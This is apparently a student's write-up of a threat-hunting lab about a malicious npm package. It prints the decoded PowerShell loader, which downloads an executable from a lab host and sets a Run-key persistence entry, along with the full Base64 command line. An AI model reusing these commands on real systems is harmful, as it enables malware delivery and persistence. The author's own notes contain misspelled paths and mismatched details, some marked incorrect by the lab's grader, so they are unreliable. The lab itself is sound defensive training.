<h1 align="center">Threat Hunting Simulator<br>Health Hazard</h1>
<p align="center">July 22, 2025<br>
<img width="80px" src="https://github.com/user-attachments/assets/5004481d-32ab-4e7a-93e4-a81298688e73"></p>

<br>

<h2>Briefing</h2>
<p>After months of juggling content calendars and caffeine-fueled brainstorming, co-founder Tom Whiskers finally carved out time to build the company’s first website. It was supposed to be simple: follow a tutorial, install a few packages, and bring the brand to life with lightweight JavaScript magic.<br>

But between sleepless nights and copy-pasted code, Tom started feeling off. Not sick exactly, just off. The terminal scrolled with reassuring green text, the site loaded fine, and everything looked normal.<br>

Then, a strange file appeared on the system. No one could say where it came from. It wasn’t part of the tutorial, didn’t match any known dependencies, and didn’t even run.<br>

It just waited.</p>

<br>

<h2>Objectives</h2>

<p>

- Determine how a threat actor first gained a foothold on the system. Identify suspicious activity that may point to the initial compromise method.<br>
- Investigate signs of malicious execution following the initial access. Analyse the logs and system behaviour to uncover the attacker's actions.<br>
- Identify any mechanisms the attacker used to maintain access across system restarts or user sessions. Look for indicators of persistence that could allow long-term control.
  
</p>

<br>

<h2>Mission</h2>
<p>

- <code>Review threat intel and hypothesis</code>: The Threat Intel hub contains IOCs, attack timelines, analyst notes, and a working hypothesis to assess. Study the intel closely to understand the full context and spot any gaps. Your task is to prove or disprove the hypothesis through investigation.<br><br>
- <code>Investigate and reconstruct the attack chain</code>: Use the SIEM and virtual machine to trace the attack. Correlate logs, analyze forensic data, and map each step the adversary took. Build your attack chain to understand how and why it happened.<br><br>
- <code>Review report and conclude</code>: Submit your attack chain and review the AI-generated report, which details the timeline from initial foothold to full compromise. Then, state whether you accept or refute the hypothesis. Hit Submit to finish.
</p>

<p>____________________</p>

<p>Your task as a Threat Hunter is to conduct a comprehensive hunting session in the TryGovMe environment to identify potential anomalies and threats. You are expected to:<br>
  
- <strong>Validate a Hunting Hypothesis</strong><br>
Investigate the given hypothesis and determine - based on your findings - whether it is valid or not.<br><br>
- <strong>Review IOCs from External Sources</strong><br>
Analyse the list of Indicators of Compromise provided by security teams from compromised partner organisations. These may lead you to uncover additional malicious activity or pivot points.<br><br>
- <strong>Reconstruct the Attack Chain</strong><br>
Perform a detailed investigation within the environment and reconstruct the attack chain, starting from the initial point of compromise to the attacker's final objective.<br><br>
- <strong>Determine the Scope of the Incident</strong><br>
Identify the impacted users, systems, and assets. Understanding the full scope is critical for response and containment.<br><br>
- <strong> Generate a Final Threat Hunting Report</strong><br>
Based on your findings and the reconstructed attack chain, compile a final Threat Hunting report highlighting the key observations and affected entities.<br>
</p>

<br>

<h2>Executive Summary</h2>
<p><strong>Issued by</strong>: TryDetectThis Intelligence<br>

<strong>Classification</strong>: Internal – TLP:AMBER<br>

TryDetectThis Intelligence has identified a coordinated supply chain attack campaign targeting open-source ecosystems, specifically, npm and Python package repositories. The campaign appears to be orchestrated by a threat actor leveraging long-term infiltration of neglected or low-profile projects to weaponize legitimate packages.<br>

The attacker’s strategy involves contributing to moderately used but under-maintained libraries, gaining contributor or maintainer status through helpful commits. Once trusted, they publish malicious updates, embedding post-installation payloads or obfuscated backdoors within version releases that appear minor or maintenance-related.<br>

These weaponized libraries often act as stagers for follow-on actions—such as downloading secondary payloads, establishing persistence, or exfiltrating tokens and credentials from developer machines. Due to their presence in tutorials, starter templates, or widely shared codebases, they have a high chance of spreading through organic adoption.</p>

<br>

<h2>Hypothesis</h2>
<p>An attacker may have leveraged a compromised third-party software package to gain initial access to the system and silently stage a payload for later execution. They likely established persistence to maintain access without immediate detection.</p>

<br>

<h2>IOCs</h2>

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/b7afbd06-ce7c-4239-85c2-5553c3610085"></p>

<br>

<h2>Documentation</h2>
<h3>Company Information</h3>
<p><code>PassPressMe</code> is a lean online media company that helps small brands and startups tell their stories through digital content, ebooks, and social media strategy.<br>

From cyber security whitepapers to playful lifestyle campaigns, PawPressMe produces fast-turnaround content that helps clients grow their digital presence.<br>

The company operates with a small creative team, collaborative tools, and a high-volume content pipeline, making speed and flexibility core to its value.</p>

<h3>Employees</h3>

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5ec95b8d-586b-4bf3-89e9-9d8b0e11160e"></p>

<h3>Asset Inventory</h3>

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/6836f2b6-39fe-4959-bdec-456c761f0671"></p>

<br>


<h2>Practice</h2>

<p>
  
- <strong>Executive Summary</strong>: <code>npm</code> and <code>Python</code> repositories<br>
- <strong>Documentation</strong> > <strong>Asset Inventory</strong>: <codePassPressMe Corporate LAN</code> : <code>10.10.50.0/24</code> and <code>Backup Server</code> : <code>pawnbackup</code> : <code>10.10.150.5</code></p>

<br>

<h3>Timeline</h3>

<h4>Stage 1 of 3</h4>

<p>  

- Title: <code>Initial Access</code><br>
- Adversary step description: Initial Access was gained at Jul 21st 2025 10:58:27 by installing  "healthchk-lib@1.0.1" NPM package. Next "postintall.ps1" was downloaded and installed through PowerShell employing the following syntax to cover the related actions "-NoP -W Hidden -EncodedCommand".  "postinstall.ps1" execute automotically and was downloaded from global-update.windows.thm.<br>
- Timestamp: Jul 21st 2025 10:58:27<br>
- Tactic: Initial Access<br>
- Technique: Supply Chain Compromise<br>
- User: <code>tom@pawpress.me</code><br>
- Asset: <code>paw-tom</code>br>
- List of IOCs:<br>
   --- Host = <code>paw-tom</code>
   --- Current Directory = C:\Development\node_modules\healthchk-lib\<br>
   --- Process ID = 5880<br>
   --- Image = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe<br>
   --- Parent Image = C:\Windows\System32\cmd.exe<br>
   --- Parent Process ID = 1616<br>
- SIEM URL Link: Redacted
</p>

```bash
* node
| table _time category subject host ComputerName Account_Domain Account_Name  EventCode OriginalFileName CommandLine ParentCommandLine Image ParentImage Hashes
|  sort by +_time
```


<img width="1898" height="880" alt="image" src="https://github.com/user-attachments/assets/f5ea681a-fb2a-4084-9604-af3d34cbd5f6" />

<img width="1902" height="879" alt="image" src="https://github.com/user-attachments/assets/adbbb87c-9120-4f19-9f16-0dc7a9f78c98" />

<img width="1897" height="469" alt="image" src="https://github.com/user-attachments/assets/9a7fbc9b-ebf1-4229-9a77-f89b57502b43" />




<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/557360e1-2958-4afe-a130-72cb3fb4d8c0"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/149ae7e3-156c-4d27-b4f4-c7dd7af2b539"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/c03e7479-1977-4590-acba-965af0f48a2c"><br>
                  <img width="400px" src="https://github.com/user-attachments/assets/0639c45a-2532-48af-89c4-2776c1c8080b"></p>


<img width="280" height="149" alt="image" src="https://github.com/user-attachments/assets/b4593096-c30c-494c-83a3-99f109791efe" />



<br>


<h4>Stage 2 of 3</h4>

<p>  

- Title: Malicious Script Execution Post NPM package Installation<br>
- Adversary step description: After installing the compromised NPM package, the postinstall.ps1 script executed automatically running a hidden PowerShell script encoded. This script downloaded the executable SystemHealthUpdater.ex eto APPDATA using command Invoke-WebRequest.<br>
- Timestamp: Jul 21st 2025 10:58:27<br>
- Tactic: Execution<br>
- Technique: Command and Scripting Interpreter<br>
- User: tom@pawpress.me<br>
- Asset: paw-tom<br>
- List of IOCs:<br>
Decoding the Command Line identified:<br>
---  Destination: $env:APPDATA\SystemHealthUpdater.exe<br>
--- URL:  http://global-update.wlndows.thm/SystemHealthUpdater.exe<br>
--- Command to Download the File:  Invoke-WebRequest -Uri $url -OutFile $dest<br>
---  Command to Encode:  $encoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes("Start-Process '$dest'")
)<br>
--- Command to Build Persistance: $runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded<br>
--- Command to register persistance:  Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'Windows Update Monitor' -Value $runCmd<br>
</p>

```bash
* node
| table _time category subject host ComputerName Account_Domain Account_Name  EventCode OriginalFileName CommandLine ParentCommandLine Image ParentImage Hashes
|  sort by +_time
```


<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/557360e1-2958-4afe-a130-72cb3fb4d8c0"><br>
                  <img width="400px" src="https://github.com/user-attachments/assets/db9d4ccc-3a1a-4c60-aeeb-231c48b0a028"></p>

<img width="292" height="149" alt="image" src="https://github.com/user-attachments/assets/3b2cfe16-d3ff-4280-900d-ef0bef4d162f" />




<br>

The malicious actor established persistsnece by modifying the user registry key 'HKCU\Software\Microsoft\Windows\CurrntVersion\Rn'.  A new valune was created to execute a hidden PowerShell command = 'Windows Update Monitor'. This command encoded in Base64 and downloaded the payload again and again. 'SystemHealthUpdated.exe' guaranteed the execution.

<h4>Stage 3 of 3</h4>

<p>  

- Title: Persistence Registry<br>
- Adversary step descrirption:Persistence was established by modifying user´s registry key The NPM package ran a hidder PowerShell script using  Ba64 encoding and leading to download and executable file to %APPDATA%.<br>
- Timestamp: Jul 21st 2025 10:59:04<br>
- Tactic: Execution<br>
- Technique: Scheduled Task/Job<br>
- User: tom@pawpress.me<br>
- Asset: paw-tom<br>
- List of IOCs:<br>
ComputerName=paw-tom
ProcessId: 1924
Image: C:\Program Files\nodejs\node.exe
FileVersion: 22.16.0
Description: Node.js JavaScript Runtime
Product: Node.js
Company: Node.js
OriginalFileName: node.exe
CommandLine: "C:\Program Files\nodejs\node.exe" "C:\Program Files\nodejs/node_modules/npm/bin/npm-prefix.js"
CurrentDirectory: C:\Development\
User: PAW-TOM\itadmin-tom
ParentProcessId: 4668
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" ParentUser: PAW-TOM\itadmin-tom
    -Name 'Windows Update Monitor' -Value $runCmd<br>
</p>




https://github.com/user-attachments/assets/8e16fc80-4362-4403-9265-367f455d59f7
                  
https://github.com/user-attachments/assets/edc01325-518e-46fa-84d0-54d3e1f968a1

<img width="1900" height="830" alt="image" src="https://github.com/user-attachments/assets/ebd4d11c-3a19-4924-88d0-e12511c4208a" />


<img width="282" height="149" alt="image" src="https://github.com/user-attachments/assets/b20764d7-d989-48af-85dc-086685eddb3c" />




<img width="1656" height="233" alt="image" src="https://github.com/user-attachments/assets/71ce1b23-9a6f-4218-8888-2b81003fd963" />




<br>

<h3>Hypothesis = <code>Proven</code></h3>

<br>

<h3>Threat Report</h3>


<p>Threat Case Report: Supply Chain Compromise
Executive Summary
Initial Access
Description: The adversary gained initial access by installing a compromised NPM package, healthchk-lib@1.0.1, which included a postinstall.ps1 script. This script executed automatically using a PowerShell command encoded in Base64, downloading a malicious file from global-update.windows.thm.
Tactic & Technique: Initial Access (TA0001), Supply Chain Compromise (T1195)
User & Asset: tom@pawpress.me, paw-tom
Timestamp: Mon Jul 21 2025 11:58:27 GMT+0100 (British Summer Time)
Malicious Script Execution
Description: The postinstall.ps1 script executed a hidden PowerShell command to download SystemHealthUpdater.exe into the APPDATA directory using Invoke-WebRequest.
Tactic & Technique: Execution (TA0002), Command and Scripting Interpreter (T1059)
User & Asset: tom@pawpress.me, paw-tom
Timestamp: Mon Jul 21 2025 11:58:27 GMT+0100 (British Summer Time)
Registry-Based Persistence
Description: Persistence was established by modifying the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run to include a new entry for a PowerShell command, ensuring SystemHealthUpdater.exe would execute repeatedly.
Tactic & Technique: Persistence (TA0003), Boot or Logon Autostart Execution (T1547)
User & Asset: tom@pawpress.me, paw-tom
Timestamp: Mon Jul 21 2025 11:59:04 GMT+0100 (British Summer Time)
Impact and Findings
The attack leveraged a supply chain compromise to gain access and execute malicious scripts, ultimately achieving persistence via registry modifications. This method ensures continuous payload execution, posing a significant threat to system integrity and security.

For further analysis and incident response, please refer to the detailed logs and SIEM links provided in each stage's description..</p>


<img width="1152" height="574" alt="image" src="https://github.com/user-attachments/assets/b0f4c8ce-eefc-453e-86ba-3f99f70500a4" />

<img width="1125" height="822" alt="image" src="https://github.com/user-attachments/assets/6bd01d1e-741e-44c6-886f-850027d59ccf" />


Indicators of compromise [IOCs] detected
The following is a breakdown of all IOCs, detected and undetected.

Host based
NPM Package
Stage 1
PowerShell Command
Stage 2
Decoded Command
Stage 2
Registry Path
Stage 3
Registry Value Name
Stage 3






The malicious actor gained initilal access by installing a NPM package healthchk-lib@1.0.1, installing and downloading postinstall.ps1 script. which run automatically hidden in PowerShell through "NoP -W Hidden -EncodedCommand". postinstall.ps1 execute a malicious file from an external source: global-update.windows.thm.

Initial Access

T1195

tom@pawpress.me

paw-tom

CommandLine: powershell.exe -NoP -W Hidden -EncodedCommand JABkAGUAcwB0ACAAPQAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABTAHkAcwB0AGUAbQBIAGUAYQBsAHQAaABVAHAAZABhAHQAZQByAC4AZQB4AGUAIgANAAoAJAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZwBsAG8AYgBhAGwALQB1AHAAZABhAHQAZQAuAHcAbABuAGQAbwB3AHMALgB0AGgAbQAvAFMAeQBzAHQAZQBtAEgAZQBhAGwAdABoAFUAcABkAGEAdABlAHIALgBlAHgAZQAiAA0ACgANAAoAIwAgAEQAbwB3AG4AbABvAGEAZAAgAGYAaQBsAGUADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABkAGUAcwB0AA0ACgANAAoAIwAgAEIAYQBzAGUANgA0ACAAZQBuAGMAbwBkAGUAIAB0AGgAZQAgAGMAbwBtAG0AYQBuAGQADQAKACQAZQBuAGMAbwBkAGUAZAAgAD0AIABbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgADQAKACAAIAAgACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAiAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAnACQAZABlAHMAdAAnACIAKQANAAoAKQANAAoADQAKACMAIABCAHUAaQBsAGQAIABwAGUAcgBzAGkAcwB0AGUAbgBjAGUAIABjAG8AbQBtAGEAbgBkAA0ACgAkAHIAdQBuAEMAbQBkACAAPQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIAAnACAAKwAgACQAZQBuAGMAbwBkAGUAZAANAAoADQAKACMAIABBAGQAZAAgAHQAbwAgAHIAZQBnAGkAcwB0AHIAeQAgAGYAbwByACAAcABlAHIAcwBpAHMAdABlAG4AYwBlAA0ACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAnACAAYAANAAoAIAAgACAAIAAtAE4AYQBtAGUAIAAnAFcAaQBuAGQAbwB3AHMAIABVAHAAZABhAHQAZQAgAE0AbwBuAGkAdABvAHIAJwAgAC0AVgBhAGwAdQBlACAAJAByAHUAbgBDAG0AZAA=
Company: Microsoft Corporation
ComputerName: paw-tom
CurrentDirectory: C:\Development\node_modules\healthchk-lib\
Description: Windows PowerShell
OriginalFileName: PowerShell.EXE
ParentCommandLine: C:\Windows\system32\cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand JABkAGUAcwB0ACAAPQAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABTAHkAcwB0AGUAbQBIAGUAYQBsAHQAaABVAHAAZABhAHQAZQByAC4AZQB4AGUAIgANAAoAJAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZwBsAG8AYgBhAGwALQB1AHAAZABhAHQAZQAuAHcAbABuAGQAbwB3AHMALgB0AGgAbQAvAFMAeQBzAHQAZQBtAEgAZQBhAGwAdABoAFUAcABkAGEAdABlAHIALgBlAHgAZQAiAA0ACgANAAoAIwAgAEQAbwB3AG4AbABvAGEAZAAgAGYAaQBsAGUADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABkAGUAcwB0AA0ACgANAAoAIwAgAEIAYQBzAGUANgA0ACAAZQBuAGMAbwBkAGUAIAB0AGgAZQAgAGMAbwBtAG0AYQBuAGQADQAKACQAZQBuAGMAbwBkAGUAZAAgAD0AIABbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgADQAKACAAIAAgACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAiAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAnACQAZABlAHMAdAAnACIAKQANAAoAKQANAAoADQAKACMAIABCAHUAaQBsAGQAIABwAGUAcgBzAGkAcwB0AGUAbgBjAGUAIABjAG8AbQBtAGEAbgBkAA0ACgAkAHIAdQBuAEMAbQBkACAAPQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIAAnACAAKwAgACQAZQBuAGMAbwBkAGUAZAANAAoADQAKACMAIABBAGQAZAAgAHQAbwAgAHIAZQBnAGkAcwB0AHIAeQAgAGYAbwByACAAcABlAHIAcwBpAHMAdABlAG4AYwBlAA0ACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAnACAAYAANAAoAIAAgACAAIAAtAE4AYQBtAGUAIAAnAFcAaQBuAGQAbwB3AHMAIABVAHAAZABhAHQAZQAgAE0AbwBuAGkAdABvAHIAJwAgAC0AVgBhAGwAdQBlACAAJAByAHUAbgBDAG0AZAA=
ParentImage: C:\Windows\System32\cmd.exe
ParentProcessId: 1616
ParentUser: PAW-TOM\itadmin-tom
ProcessGuid: {c5d2b969-9053-6856-e701-000000002a01}
ProcessId: 5880
Product: Microsoft® Windows® Operating System
RecordNumber: 43451






After installing the compromised NPM package, the postinstall.ps1 script executed automatically running a hidden PowerShell script encoded. This script downloaded the executable SystemHealthUpdater.ex eto APPDATA using command Invoke-WebRequest.

Incorrect
Description analysis
POWERED BY AI


Execution

T1059

Your report provides a clear overview of the incident involving the installation of a compromised NPM package, leading to the execution of a hidden PowerShell script. However, it lacks specific details on how the PowerShell script was executed in relation to the NPM process. It's important to mention the relationship between the execution of PowerShell and the npm process, specifically noting if PowerShell was executed as a child of the npm process through cmd.exe. Additionally, while you noted that the PowerShell script was encoded, it would be beneficial to specify that Base64 encoding was used, as this detail helps in understanding the evasion tactics employed by the adversary. Overall, your analysis is on the right track, but including these additional details would enhance its accuracy and depth.

tom@pawpress.me

paw-tom



___

Adversary step description:
The malicious actor established persistsnece by modifying the user registry key 'HKCU\Software\Microsoft\Windows\CurrntVersion\Rn'. A new valune was created to execute a hidden PowerShell command = 'Windows Update Monitor'. This command encoded in Base64 and downloaded the payload again and again. 'SystemHealthUpdated.exe' guaranteed the execution.

Incorrect
Description analysis
POWERED BY AI
The report details a persistence mechanism used by the adversary, involving the modification of a registry key. However, there are some inaccuracies in the description. The key path mentioned contains a typographical error, which could lead to misunderstandings or misconfigurations during analysis. Additionally, the explanation of how the registry modification occurred lacks clarity, particularly regarding the role of the PowerShell script and the postinstall command. It's crucial to provide precise technical details to ensure accurate threat detection and response. Make sure to verify the registry key paths and the sequence of actions to improve the accuracy of your reports in the future.

Tactic:
Persistence

+20 points
Technique:
T1547

+20 points
User (Optional):
tom@pawpress.me

+10 points
Asset:
paw-tom

List of IOCs:
CommandLine: "C:\Program Files\nodejs\node.exe" "C:\Program Files\nodejs/node_modules/npm/bin/npm-cli.js" list
Company: Node.js
ComputerName: paw-tom
CurrentDirectory: C:\Development\
Description: Node.js JavaScript Runtime
EventCode: 1
EventType: 4
FileVersion: 22.16.0
Hashes: MD5=0E35FC3B0EC975B76843501524C2F269,SHA256=C5FF4C736112DD483C750FD4149D30C8A116DB1A49B8B3EC88BE4B65E6C86C19,IMPHASH=414BABB6B54E11CCDAA7AB6CEE795375
Image: C:\Program Files\nodejs\node.exe
IntegrityLevel: High
Keywords: None
LogName: Microsoft-Windows-Sysmon/Operational
LogonGuid: {c5d2b969-8e55-6856-61d5-050000000000}
LogonId: 0x5D561
OpCode: Info
OriginalFileName: node.exe
ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentProcessGuid: {c5d2b969-906a-6856-f201-000000002a01}
ParentProcessId: 4668
ParentUser: PAW-TOM\itadmin-tom
ProcessGuid: {c5d2b969-9078-6856-f501-000000002a01}
ProcessId: 464
Product: Node.js
RecordNumber: 43466
RuleName: -
Sid: S-1-5-18
SidType: 0
SourceName: Microsoft-Windows-Sysmon
TaskCategory: Process Create (rule: ProcessCreate)
TerminalSessionId: 2
Type: Information








